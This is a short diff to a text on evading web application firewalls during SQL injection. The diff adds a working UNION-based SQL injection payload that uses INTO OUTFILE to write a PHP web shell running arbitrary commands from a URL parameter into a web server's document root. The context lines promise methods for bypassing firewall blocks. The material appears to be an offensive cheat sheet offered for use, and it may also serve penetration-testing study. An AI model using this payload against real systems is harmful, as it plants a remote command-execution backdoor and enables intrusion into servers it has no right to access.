@@ -1,3 +1,7 @@
+php webshell creation with union based injection:
+' UNION SELECT "<?php system($_GET['cmd']);?>",'b','c','d',NULL into OUTFILE "/var/www/html/tmp/webshell.php"-- //
+
+
 WAF evasion methods for sql Injections 
 
 I want to share WAF evasion methods for sql Injections. Most are old but few are newer. You can bypass most of the "404 forbidden" and "NOT Acceptable" errors by these methods.
